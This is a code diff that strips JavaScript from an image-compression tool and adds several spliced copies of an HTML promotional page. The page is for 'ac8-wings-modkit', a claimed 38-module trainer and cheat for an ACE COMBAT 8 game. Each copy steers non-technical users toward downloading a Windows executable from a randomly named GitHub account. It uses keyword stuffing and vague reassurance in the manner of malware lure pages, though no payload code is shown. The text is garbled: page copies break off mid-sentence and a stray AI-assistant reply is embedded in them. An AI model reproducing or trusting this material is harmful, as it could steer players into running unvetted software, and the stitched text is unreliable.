+    <p>ac8-wings-modkit is a utility suite built for ACE COMBAT 8: Wings of Theve. It brings 38 individual modules into one application, so you do not need to manage a collection of separate tools. Players often find the project through searches for <strong>ace combat 8 trainer</strong> or <strong>ace combat 8 cheat</strong>, and the toolkit is designed to be approachable for someone who has never used a game utility before.</p>
+    <p>The suite is organised around four areas of the game: aerial combat, aircraft performance, MRP economy and mission tools. Each area contains several modules. A module is simply a switch you turn on or off. When a switch is on, that tool is active. When it is off, it has no effect. This design keeps the suite predictable and lets you use only the parts that matter to you.</p>
+    <p>You do not need programming knowledge, configuration files or command-line experience. The application presents its options in plain language, and every module can be changed independently. If you want to test a single aircraft performance adjustment, you can do that without activating anything else. If you want to focus on MRP economy, the same principle applies.</p>
+  </section>
 
-            if (inputW > 0 && inputH > 0) {
-                outputWidth = inputW;
-                outputHeight = inputH;
-            }
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">🧩 Inside the 38 Modules</h2>
+    <p>The modules are grouped by purpose. Most players settle on a few favourites rather than turning everything on at once, which is the recommended way to use the suite.</p>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(230px,1fr)); gap:16px; margin:20px 0 10px;">
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">🎯 Aerial Combat</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Tools that influence targeting behaviour, weapon readiness and the pace of engagements during flight.</p>
+      </div>
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">🛠️ Aircraft Performance</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Adjustments for handling, acceleration, climbing and turning so you can explore different flight profiles.</p>
+      </div>
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">💰 MRP Economy</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Controls connected to Mission Reward Points, including how quickly your budget grows in the hangar.</p>
+      </div>
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">🗺️ Mission Tools</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Helpers for mission flow, objectives and replaying content when a sortie needs another attempt.</p>
+      </div>
+    </div>
+    <p>The aerial combat group is for the moment-to-moment action. These modules affect how an engagement feels, from target acquisition to the behaviour of special weapons. The aircraft performance group is for flight-model experimentation. You can make a heavy airframe climb differently or hold a turn for longer, then switch the module off when you want the default handling back.</p>
+    <p>The MRP economy group focuses on progression pace. ACE COMBAT 8 has a large aircraft tree, and MRP is the currency that unlocks it. These modules give you ways to reach the aircraft you want without a long grind. The mission tools group sits around the sortie itself, helping with mission flow and repeat attempts. All groups are independent, so a module in one group never depends on a module in another.</p>
+  </section>
 
-            const canvas = document.createElement('canvas');
-            canvas.width = outputWidth;
-            canvas.height = outputHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.imageSmoothingEnabled = true;
-            ctx.imageSmoothingQuality = 'high';
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">💻 Windows System Requirements</h2>
+    <p>The application is intended for Windows PCs that can already run ACE COMBAT 8: Wings of Theve. The toolkit itself is light and does not need a high-end graphics card or a large amount of disk space.</p>
+    <table style="width:100%; border-collapse:collapse; margin:16px 0 8px; font-size:0.95rem; background:#ffffff; border-radius:12px; overflow:hidden;">
+      <tr><th style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; background:#f8fafc; color:#111827; font-weight:700;">Item</th><th style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; background:#f8fafc; color:#111827; font-weight:700;">Requirement</th></tr>
+      <tr><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Operating system</td><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Windows 10 or Windows 11, 64-bit</td></tr>
+      <tr><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Game</td><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">ACE COMBAT 8: Wings of Theve, installed and running</td></tr>
+      <tr><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Disk space</td><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">A small amount of free space for the toolkit file</td></tr>
+      <tr><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Permissions</td><td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Ability to open a downloaded application</td></tr>
+      <tr><td style="text-align:left; padding:12px 16px; border-bottom:none; color:#374151;">Input</td><td style="text-align:left; padding:12px 16px; border-bottom:none; color:#374151;">Mouse and keyboard</td></tr>
+    </table>
+  </section>
 
-            let format = formatSelect.value === 'original' ? item.type : formatSelect.value;
-            if (!['image/jpeg', 'image/webp', 'image/png'].includes(format)) format = 'image/jpeg';
-            if (format === 'image/jpeg') {
-                ctx.fillStyle = '#ffffff';
-                ctx.fillRect(0, 0, outputWidth, outputHeight);
-            }
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">📥 Download and Setup</h2>
+    <p>Visit <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="color:#db2777;">this link</a> to download the application. The project page is the single place to get the current toolkit file.</p>
+    <p>Keep the downloaded file in a folder you can find again, such as Downloads or a new folder on your desktop named AC8. The toolkit is opened from that location when you are ready to use it. No account, extra file or second tool is needed.</p>
+    <div style="background:#fff1f2; border-left:5px solid #db2777; border-radius:12px; padding:18px 22px; margin:22px 0;">
+      <p style="margin:0 0 10px;"><strong>Download link:</strong> <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="color:#db2777; font-weight:700;">https://github.com/changefulnesspitstop975/ac8-wings-modkit</a></p>
+      <p style="margin:0;"><strong>Action:</strong> Visit this link to download the application.</p>
+    </div>
+  </section>
 
-            ctx.drawImage(item.originalImage, 0, 0, outputWidth, outputHeight);
-            const quality = parseFloat(qualityRange.value) / 100;
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">🚀 First Launch Walkthrough</h2>
+    <p>When the toolkit opens for the first time, you will see a plain window with the four module groups. Nothing is switched on by default, which is intentional. You always know exactly what is active.</p>
+    <p><strong>Step 1 — Confirm the game is running.</strong> Start ACE COMBAT 8: Wings of Theve first and reach the main menu or a mission. If the toolkit shows a connection status, confirm it reads as connected.</p>
+    <p><strong>Step 2 — Start with one module.</strong> Choose a single module from the group you care about most. An MRP economy toggle is a good first choice because the effect is easy to notice after a mission.</p>
+    <p><strong>Step 3 — Test in a low-pressure mission.</strong> Use a mission you have already completed rather than a story-critical one. This keeps your first experience calm and lets you compare the difference.</p>
+    <p><strong>Step 4 — Add more gradually.</strong> Once one module behaves the way you expect, add a second. Change one thing at a time and the whole suite stays predictable.</p>
+    <p><strong>Step 5 — Switch off when you are done.</strong> Turn modules off before closing the toolkit, or close the game and the toolkit together. Your next session starts clean.</p>
+  </section>
 
-            canvas.toBlob((blob) => {
-                if (!blob) {
-                    item.isProcessing = false;
-                    renderGallery();
-                    return;
-                }
-                if (item.processedUrl) URL.revokeObjectURL(item.processedUrl);
-                item.processedBlob = blob;
-                item.processedSize = blob.size;
-                item.processedUrl = URL.createObjectURL(blob);
-                item.isProcessing = false;
-                renderGallery();
-            }, format, quality);
-        }
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">💡 Tips for a Smooth Experience</h2>
+    <ul style="margin:0 0 18px; padding-left:24px; color:#374151;">
+      <li>Run the game in windowed mode on your first attempt. It makes switching between the game and the toolkit window effortless.</li>
+      <li>Keep a short note of which modules you have switched on. A few seconds of note-taking saves confusion later.</li>
+      <li>Change one setting per mission. If something feels off, you will know exactly which module caused it.</li>
+      <li>Close background apps that overlay on top of games. A cleaner screen gives the toolkit a clearer view.</li>
+      <li>Return to defaults for story moments. Switch everything off when you want the intended experience, then switch back on afterwards.</li>
+      <li>Keep the toolkit in one folder. Moving it around while it is open can interrupt a session.</li>
+    </ul>
+  </section>
 
-        function reprocessAll() { imagesQueue.forEach(item => processImage(item)); }
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">❓ Frequently Asked Questions</h2>
+    <h3 style="font-size:1.08rem; margin:26px 0 8px; color:#1e293b; font-weight:700;">Do I need to know how to code?</h3>
+    <p>No. There is no scripting, no command line<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools. Visit the project page to download the application for Windows.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#db2777">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties">
+<meta property="og:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Aerial combat, aircraft performance, MRP economy and mission tools in one Windows application.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties">
+<meta name="twitter:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+</head>
+<body style="margin:0; padding:0; background:#f4f6fb; color:#1f2937; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size:17px; line-height:1.75; -webkit-font-smoothing:antialiased;">
+<main style="width:100%; max-width:880px; margin:0 auto; padding:clamp(24px, 5vw, 40px) clamp(14px, 4vw, 22px) clamp(40px, 8vw, 70px);">
 
-        qualityRange.addEventListener('input', (e) => qualityVal.textContent = `${e.target.value}%`);
-        qualityRange.addEventListener('change', reprocessAll);
-        formatSelect.addEventListener('change', reprocessAll);
+  <header style="background:#ffffff; border-radius:20px; padding:clamp(28px, 5vw, 42px) clamp(18px, 4vw, 32px) clamp(26px, 4vw, 36px); box-shadow:0 6px 24px rgba(31,41,55,0.08); border:1px solid #e6eaf3; text-align:center;">
+    <h1 style="font-size:clamp(1.65rem, 5vw, 2.35rem); line-height:1.25; margin:0 0 14px; color:#111827; font-weight:800; letter-spacing:-0.02em;">🛩️ ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties</h1>
+    <p style="font-size:1.08rem; color:#4b5563; max-width:640px; margin:0 auto 28px;">A 38-module utility suite for ACE COMBAT 8: Wings of Theve — aerial combat, aircraft performance, MRP economy and mission tools in one straightforward Windows application.</p>
+    <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="display:inline-block; padding:clamp(14px, 3vw, 17px) clamp(24px, 6vw, 38px); border-radius:14px; background:linear-gradient(135deg, #db2777 0%, #f59e0b 100%); color:#ffffff; font-size:1.08rem; font-weight:700; text-decoration:none; box-shadow:0 10px 26px rgba(219,39,119,0.32); letter-spacing:0.01em;">⬇️ Download ac8-wings-modkit</a>
+    <p style="font-size:0.9rem; color:#6b7280; margin:16px 0 0;">Visit this link to download the application.</p>
+  </header>
 
-        targetWidthInput.addEventListener('input', () => {
-            if (lockAspectCheck.checked && targetWidthInput.value && primaryAspectRatio) {
-                targetHeightInput.value = Math.round(targetWidthInput.value / primaryAspectRatio);
-            }
-        });
-        targetHeightInput.addEventListener('input', () => {
-            if (lockAspectCheck.checked && targetHeightInput.value && primaryAspectRatio) {
-                targetWidthInput.value = Math.round(targetHeightInput.value * primaryAspectRatio);
-            }
-        });
-        applyBtn.addEventListener('click', reprocessAll);
-        clearAllBtn.addEventListener('click', () => {
-            imagesQueue.forEach(item => { if (item.processedUrl) URL.revokeObjectURL(item.processedUrl); });
-            imagesQueue = [];
-            targetWidthInput.value = '';
-            targetHeightInput.value = '';
-            updateUIState();
-        });
+  <section>
+    <h2 style="font-size:clamp(1.25rem, 3.6vw, 1.55rem); line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750; letter-spacing:-0.01em;">🎯 What This Toolkit Is</h2>
+    <p style="margin:0 0 16px; color:#374151;">ac8-wings-modkit is a utility suite built for ACE COMBAT 8: Wings of Theve. It brings 38 individual modules into one application, so you do not need to manage a collection of separate tools. Players often find this project through searches for <strong style="color:#111827;">ace combat 8 trainer</strong> or <strong style="color:#111827;">ace combat 8 cheat</strong>, and the toolkit is designed to be approachable for someone who has never used a game utility before.</p>
+    <p style="margin:0 0 16px; color:#374151;">The suite is organised around four areas of the game: aerial combat, aircraft performance, MRP economy and mission tools. Each area contains several modules. A module is simply a switch you turn on or off. When a switch is on, that tool is active. When it is off, it has no effect. This design keeps the suite predictable and lets you use only the parts that matter to you.</p>
+    <p style="margin:0 0 16px; color:#374151;">You do not need programming knowledge, configuration files or command-line experience. The application presents its options in plain language, and every module can be changed independently. If you want to test a single aircraft performance adjustment, you can do that without activating anything else. If you want to focus on MRP economy, the same principle applies.</p>
+  </section>
 
-        function updateUIState() {
-            if (imagesQueue.length > 0) {
-                controlsCard.classList.remove('hidden');
-                queueHeader.classList.remove('hidden');
-            } else {
-                controlsCard.classList.add('hidden');
-                queueHeader.classList.add('hidden');
-            }
-            fileCountBadge.textContent = imagesQueue.length;
-            renderGallery();
-        }
+  <section>
+    <h2 style="font-size:clamp(1.25rem, 3.6vw, 1.55rem); line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750; letter-spacing:-0.01em;">🧩 Inside the 38 Modules</h2>
+    <p style="margin:0 0 16px; color:#374151;">The modules are grouped by purpose. Most players settle on a few favourites rather than turning everything on at once, which is the recommended way to use the suite.</p>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:16px; margin:20px 0 10px;">
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">🎯 Aerial Combat</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Tools that influence targeting behaviour, weapon readiness and the pace of engagements during flight.</p>
+      </div>
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">🛠️ Aircraft Performance</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Adjustments for handling, acceleration, climbing and turning so you can explore different flight profiles.</p>
+      </div>
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">💰 MRP Economy</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Controls connected to Mission Reward Points, including how quickly your budget grows in the hangar.</p>
+      </div>
+      <div style="background:#ffffff; border:1px solid #e6eaf3; border-radius:14px; padding:20px 20px 14px; box-shadow:0 3px 12px rgba(31,41,55,0.05);">
+        <h3 style="margin-top:0; font-size:1rem; color:#1e293b; font-weight:700;">🗺️ Mission Tools</h3>
+        <p style="margin:0; font-size:0.94rem; color:#4b5563;">Helpers for mission flow, objectives and replaying content when a sortie needs another attempt.</p>
+      </div>
+    </div>
+    <p style="margin:0 0 16px; color:#374151;">The aerial combat group is for the moment-to-moment action. These modules affect how an engagement feels, from target acquisition to the behaviour of special weapons. The aircraft performance group is for flight-model experimentation. You can make a heavy airframe climb differently or hold a turn for longer, then switch the module off when you want the default handling back.</p>
+    <p style="margin:0 0 16px; color:#374151;">The MRP economy group focuses on progression pace. ACE COMBAT 8 has a large aircraft tree, and MRP is the currency that unlocks it. These modules give you ways to reach the aircraft you want without a long grind. The mission tools group sits around the sortie itself, helping with mission flow and repeat attempts. All groups are independent, so a module in one group never depends on a module in another.</p>
+  </section>
 
-        function formatBytes(bytes, decimals = 1) {
-            if (!+bytes) return '0 B';
-            const k = 1024;
-            const dm = decimals < 0 ? 0 : decimals;
-            const sizes = ['B', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
-        }
+  <section>
+    <h2 style="font-size:clamp(1.25rem, 3.6vw, 1.55rem); line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750; letter-spacing:-0.01em;">💻 Windows System Requirements</h2>
+    <p style="margin:0 0 16px; color:#374151;">The application is intended for Windows PCs that can already run ACE COMBAT 8: Wings of Theve. The toolkit itself is light and does not need a high-end graphics card or a large amount of disk space.</p>
+    <table style="width:100%; border-collapse:collapse; margin:16px 0 8px; font-size:0.95rem; background:#ffffff; border-radius:12px; overflow:hidden;">
+      <tr>
+        <th style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; background:#f8fafc; color:#111827; font-weight:700;">Item</th>
+        <th style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; background:#f8fafc; color:#111827; font-weight:700;">Requirement</th>
+      </tr>
+      <tr>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Operating system</td>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Windows 10 or Windows 11, 64-bit</td>
+      </tr>
+      <tr>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Game</td>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">ACE COMBAT 8: Wings of Theve, installed and running</td>
+      </tr>
+      <tr>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Disk space</td>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">A small amount of free space for the toolkit file</td>
+      </tr>
+      <tr>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Permissions</td>
+        <td style="text-align:left; padding:12px 16px; border-bottom:1px solid #e6eaf3; color:#374151;">Ability to open a downloaded application</td>
+      </tr>
+      <tr>
+        <td style="text-align:left; padding:12px 16px; border-bottom:none; color:#374151;">Input</td>
+        <td style="text-align:left; padding:12px 16px; border-bottom:none; color:#374151;">Mouse and keyboard</td>
+      </tr>
+    </table>
+  </section>
 
-        function getFileExtension(filename, formatValue) {
-            if (formatValue === 'original') {
-                const parts = filename.split('.');
-                return parts.length > 1 ? parts.pop().toLowerCase() : 'jpg';
-            }
-            if (formatValue === 'image/jpeg') return 'jpg';
-            if (formatValue === 'image/webp') return 'webp';
-            if (formatValue === 'image/png') return 'png';
-            return 'jpg';
-        }
+  <section>
+    <h2 style="font-size:clamp(1.25rem, 3.6vw, 1.55rem); line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750; letter-spacing:-0.01em;">📥 Download and Setup</h2>
+    <p style="margin:0 0 16px; color:#374151;">Visit <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="color:#db2777; font-weight:600;">this link</a> to download the application. The project page is the single place to get the current toolkit file.</p>
+    <p style="margin:0 0 16px; color:#374151;">Keep the downloaded file in a folder you can find again, such as Downloads or a new folder on your desktop named AC8. The toolkit is opened from that location when you are ready to use it. No account, extra file or second tool is needed.</p>
+    <div style="background:#fff1f2; border-left:5px solid #db2777; border-radius:12px; padding:18px 22px; margin:22px 0;">
+      <p style="margin:0 0 10px;"><strong style="color:#111827;">Download link:</strong> <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="color:#db2777; font-weight:700; word-break:break-word;">https://github.com/changefulnesspitstop975/ac8-wings-modkit</a></p>
+      <p style="margin:0;"><strong style="color:#111827;">Action:</strong> Visit this link to download the application.</p>
+    </div>
+  </section>
 
-        function renderGallery() {
-            imageGallery.innerHTML = '';
-            imagesQueue.forEach((item) => {
-                const savingsPct = item.processedSize ? Math.round(((item.originalSize - item.processedSize) / item.originalSize) * 100) : 0;
-                const card = document.createElement('div');
-                card.className = "bg-white p-4 rounded-xl border border-slate-200 shadow-sm flex flex-col sm:flex-row items-center justify-between gap-4 transition-all";
-                card.innerHTML = `
-                    <div class="flex items-center gap-4 w-full sm:w-auto">
-                        <div class="relative w-16 h-16 rounded-lg bg-slate-100 overflow-hidden flex-shrink-0 border border-slate-200 flex items-center justify-center">
-                            <img src="${item.originalImage.src}" class="w-full h-full object-cover">
-                            ${item.isProcessing ? `<div class="absolute inset-0 bg-black/40 flex items-center justify-center text-white"><i class="fa-solid fa-spinner fa-spin"></i></div>` : ''}
-                        </div>
-                        <div class="overflow-hidden min-w-0 flex-1">
-                            <p class="font-semibold text-slate-800 text-sm truncate" title="${item.name}">${item.name}</p>
-                            <div class="flex items-center gap-2 mt-1 text-xs">
-                                <span class="text-slate-400 line-through">${formatBytes(item.originalSize)}</span>
-                                <i class="fa-solid fa-arrow-right text-[10px] text-slate-400 rtl:rotate-180"></i>
-                                <span class="font-bold text-slate-700">${item.isProcessing ? '...' : formatBytes(item.processedSize)}</span>
-                                ${!item.isProcessing && savingsPct > 0 ? `<span class="bg-emerald-50 text-emerald-600 font-bold px-1.5 py-0.5 rounded text-[10px]">-${savingsPct}%</span>` : ''}
-                            </div>
-                        </div>
-                    </div>
-                    <div class="flex items-center gap-2 w-full sm:w-auto justify-end border-t sm:border-t-0 pt-3 sm:pt-0">
-                        <button class="download-single-btn px-3 py-1.5 bg-slate-100 hover:bg-brand-50 hover:text-brand-600 text-slate-700 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5" ${item.isProcessing ? 'disabled' : ''}>
-                            <i class="fa-solid fa-download"></i>
-                            <span>${translations[currentLang].download}</span>
-                        </button>
-                        <button class="remove-btn w-8 h-8 flex items-center justify-center text-slate-400 hover:text-red-500 rounded-lg transition-colors">
-                            <i class="fa-solid fa-xmark"></i>
-                        </button>
-                    </div>
-                `;
-                card.querySelector('.download-single-btn').addEventListener('click', () => {
-                    if (!item.processedBlob) return showToast(translations[currentLang].processing, "error");
-                    const ext = getFileExtension(item.name, formatSelect.value);
-                    const cleanName = item.name.replace(/\.[^/.]+$/, "");
-                    triggerBrowserDownload(item.processedBlob, `opti_${cleanName}.${ext}`);
-                });
-                card.querySelector('.remove-btn').addEventListener('click', () => {
-                    if (item.processedUrl) URL.revokeObjectURL(item.processedUrl);
-                    imagesQueue = imagesQueue.filter(i => i.id !== item.id);
-                    updateUIState();
-                });
-                imageGallery.appendChild(card);
-            });
-        }
+  <section>
+    <h2 style="font-size:clamp(1.25rem, 3.6vw, 1.55rem); line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750; letter-spacing:-0.01em;">🚀 First Launch Walkthrough</h2>
+    <p style="margin:0 0 16px; color:#374151;">When the toolkit opens for the first time, you will see a plain window with the four module groups. Nothing is switched on by default, which is intentional. You always know exactly what is active.</p>
+    <ol style="margin:0 0 18px; padding-left:24px; color:#374151;">
+      <li style="margin-bottom:10px;"><strong style="color:#111827;">Confirm the game is running.</strong> Start ACE COMBAT 8: Wings of Theve first and reach the main menu or a mission. If the toolkit shows a connection status, confirm it reads as connected.</li>
+      <li style="margin-bottom:10px;"><strong style="color:#111827;">Start with one module.</strong> Choose a single module from the group you care about most. An MRP economy toggle is a good first choice because the effect is easy to notice after a mission.</li>
+      <li style="margin-bottom:10px;"><strong style="color:#111827;">Test in a low-pressure mission.</strong> Use a mission you have already completed rather than a story-critical one. This keeps your first experience calm and lets you compare the difference.</li>
+      <li style="margin-bottom:10px;"><strong style="color:#111827;">Add more gradually.</strong> Once one module behaves the way you expect, add a second. Change one thing at a time and the whole suite stays predictable.</li>
+      <li style="margin-bottom:10px;"><strong style="color:#111827;">Switch off when you are done.</strong> Turn modules off before closing the toolkit, or close the game and the toolkit together. Your next session starts clean.</li>
+    </ol>
+  </section>
 
-        downloadZipBtn.addEventListener('click', async () => {
-            if (!imagesQueue.length) return;
-            if (imagesQueue.some(i => i.isProcessing)) return showToast(translations[currentLang].processing, "error");
-            if (typeof JSZip === 'undefined') return showToast("ZIP library failed to load.", "error");
+  <section>
+    <h2 style="font-size:clamp(1.25rem, 3.6vw, 1.55rem); line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750; letter-spacing:-0.01em;">💡 Tips for a Smooth Experience</h2>
+    <ul style="margin:0 0 18px; padding-left:24px; color:#374151;">
+      <li style="margin-bottom:9px;">Run the game in windowed mode on your first attempt. It makes switching between the game and the toolkit window effortless.</li>
+      <li style="margin-bottom:9px;">Keep a short note of which modules you have switched on. A few seconds of note-taking saves confusion later.</li>
+      <li style="margin-bottom:9px;">Change one setting per mission. If something feels off, you will know exactly which module caused it.</li>
+      <li style="margin-bottom:9px;">Close background apps that overlay onHere is a complete HTML document for the ac8-wings-modkit GitHub repository page. It presents the tool as an approachable Windows utility suite, with a clear download link for non-technical users.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - Fly Smarter In Every Sortie</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools. Visit the link to download the application for Windows.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - Fly Smarter In Every Sortie">
+<meta property="og:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Aerial combat, aircraft performance, MRP economy and mission tools in one Windows application.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - Fly Smarter In Every Sortie">
+<meta name="twitter:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  h1 {
+    font-size: clamp(1.65rem, 5vw, 2.3rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+    color: #111827;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 3.6vw, 1.55rem);
+    line-height: 1.3;
+    margin: 46px 0 14px;
+    letter-spacing: -0.01em;
+    color: #111827;
+    font-weight: 750;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 24px 0 8px;
+    color: #1e293b;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #374151; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; color: #374151; }
+  li { margin-bottom: 9px; }
